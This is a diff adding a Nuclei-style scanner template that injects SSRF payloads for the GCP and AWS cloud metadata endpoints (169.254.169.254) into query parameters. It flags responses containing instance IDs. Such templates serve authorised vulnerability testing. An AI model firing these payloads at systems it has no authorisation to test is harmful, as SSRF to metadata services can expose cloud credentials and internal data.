@@ -1,0 +1,36 @@
+Id: THENAWABX_MULTI_CLOUD_SSRF
+info:
+  name: 📑 Nawab-Multi-Cloud-SSRF 📑
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      cloud_metadata:
+        - "http://169.254.169.254/computeMetadata/v1/instance/id" # GCP
+        - "http://169.254.169.254/latest/meta-data/instance-id" # AWS
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{cloud_metadata}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "i-[a-f0-9]{17}"
+          - "[0-9]{15,}"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Cloudflare"
+          - "Forbidden"
+          - "Access Denied"
